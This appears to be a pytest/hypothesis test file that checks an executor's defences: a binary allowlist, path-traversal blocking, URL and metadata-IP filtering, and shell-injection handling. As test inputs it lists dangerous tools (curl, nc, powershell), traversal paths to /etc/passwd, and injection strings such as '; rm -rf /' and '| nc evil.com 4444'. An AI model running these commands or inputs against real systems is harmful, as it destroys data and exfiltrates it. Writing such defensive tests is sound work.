"""Property tests for Executor hardening (FIND-05, 06, 07)."""
import pathlib
import string
import pytest
from hypothesis import HealthCheck, given, settings, strategies as st

from core.executor import (
    Executor,
    _is_allowed_bin,
    _resolve_within,
    _validate_http_url,
)

_COMMON_SETTINGS = dict(
    max_examples=200,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.function_scoped_fixture],
)


class _Skill:
    def __init__(self, name="s", runtime=None, dir=None):
        self.name = name
        self.risk = "low"
        self.category = "test"
        self.runtime = runtime or {}
        self.dir = dir


# ══════════════════════════════════════════════════════════
# Property 1 (FIND-05): arbitrary CLI binary is rejected
# ══════════════════════════════════════════════════════════
_SUFFIXES = ["", ".exe", ".cmd", ".bat", ".com", ".EXE", ".CMD"]
_DANGEROUS = [
    "rm", "del", "cmd", "powershell", "pwsh", "bash", "sh",
    "curl", "wget", "nc", "ncat", "ssh", "scp", "npx", "uvx",
]


@settings(**_COMMON_SETTINGS)
@given(
    bin_name=st.one_of(
        st.sampled_from(_DANGEROUS),
        st.text(alphabet=string.ascii_letters, min_size=1, max_size=20),
    ),
    suffix=st.sampled_from(_SUFFIXES),
)
def test_arbitrary_cli_binary_rejected(bin_name, suffix):
    full = bin_name + suffix
    if _is_allowed_bin(full):
        # only the explicit allowlist may pass
        b = pathlib.Path(full).name.lower()
        for ext in (".exe", ".cmd", ".bat", ".com", ".ps1"):
            if b.endswith(ext):
                b = b[: -len(ext)]
                break
        assert b in {"python", "python3", "py", "node", "uv"}


# ══════════════════════════════════════════════════════════
# Property 2 (FIND-06): path traversal is blocked
# ══════════════════════════════════════════════════════════
@settings(**_COMMON_SETTINGS)
@given(
    evil=st.one_of(
        st.sampled_from([
            "../evil.py", "../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "/etc/passwd", "C:\\Windows\\notepad.exe",
            "skills/../../../evil.py",
            "a/../../b",
        ]),
    )
)
def test_python_entry_path_traversal_blocked(tmp_path, evil):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir(exist_ok=True)
    with pytest.raises(ValueError, match="Path traversal"):
        _resolve_within(skill_dir, evil)


def test_python_entry_valid_path_ok(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir(exist_ok=True)
    (skill_dir / "run.py").write_text("x", encoding="utf-8")
    got = _resolve_within(skill_dir, "run.py")
    assert got == (skill_dir / "run.py").resolve()


# ══════════════════════════════════════════════════════════
# Property 3 (FIND-07): dangerous URLs blocked, metadata always
# ══════════════════════════════════════════════════════════
@settings(**_COMMON_SETTINGS)
@given(scheme=st.sampled_from(["file", "ftp", "gopher", "dict", "data", "javascript"]))
def test_non_http_scheme_blocked(scheme):
    with pytest.raises(ValueError, match="Scheme"):
        _validate_http_url(f"{scheme}://example.com/x")


def test_metadata_ip_always_blocked_even_with_allow_local():
    with pytest.raises(ValueError, match="metadata"):
        _validate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            allow_local=True,
        )


def test_loopback_blocked_by_default():
    with pytest.raises(ValueError, match="Blocked destination"):
        _validate_http_url("http://127.0.0.1:8080/")


# ══════════════════════════════════════════════════════════
# Property 4: chaotic CLI args never inject shell
# ══════════════════════════════════════════════════════════
@settings(
    max_examples=50,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.function_scoped_fixture],
)
@given(
    arg=st.one_of(
        st.text(max_size=100),
        st.sampled_from([
            "; rm -rf /", "$(whoami)", "`id`", "\x00", "&& ls",
            "| nc evil.com 4444", "> /etc/passwd",
        ]),
    )
)
def test_chaotic_cli_args_rejected_or_safe(tmp_path, arg):
    skill_dir = tmp_path / "s"
    skill_dir.mkdir(exist_ok=True)
    (skill_dir / "run.py").write_text("pass\n", encoding="utf-8")
    ex = Executor(rate_limit_per_min=10000)
    skill = _Skill(
        runtime={
            "type": "cli",
            "bin": "python",
            "args": ["run.py", arg],
        },
        dir=skill_dir,
    )
    r = ex.run(skill, {})
    assert isinstance(r, dict)
    assert r.get("blocked") or not r.get("ok") or "ok" in r


# ══════════════════════════════════════════════════════════
# Property 5: rate limiter invariant (integration w/ Guardrails)
# ══════════════════════════════════════════════════════════
@settings(**_COMMON_SETTINGS)
@given(
    calls=st.integers(min_value=0, max_value=200),
    window=st.integers(min_value=1, max_value=60),
    limit=st.integers(min_value=1, max_value=100),
)
def test_rate_limiter_invariant(calls, window, limit):
    """Rate limit arithmetic property: over any window, accepted count <= limit."""
    timestamps = []
    accepted = 0
    for i in range(calls):
        timestamps = [t for t in timestamps if i - t < window]
        if len(timestamps) < limit:
            timestamps.append(i)
            accepted += 1
    assert accepted <= calls
    for i in range(calls):
        in_window = sum(1 for t in timestamps if i - window < t <= i)
        assert in_window <= limit
